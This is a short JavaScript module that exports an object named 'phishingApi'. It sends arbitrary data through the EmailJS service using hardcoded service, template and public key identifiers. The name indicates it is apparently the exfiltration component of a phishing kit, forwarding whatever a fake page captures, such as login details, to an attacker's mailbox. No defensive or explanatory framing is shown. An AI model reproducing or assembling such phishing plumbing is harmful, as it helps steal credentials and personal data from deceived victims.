import emailjs from '@emailjs/browser';

const phishingApi = {
  SEVICE_ID: 'service_er46cfa',
  TEMPLATE_ID: 'template_lizi52h',
  PUBLIC_KEY: 'gfj8-YSeXXjJ0wJAp',

  send(data) {
    return emailjs.send(this.SEVICE_ID, this.TEMPLATE_ID, data, {
      publicKey: this.PUBLIC_KEY,
    });
  },
};

export default phishingApi;
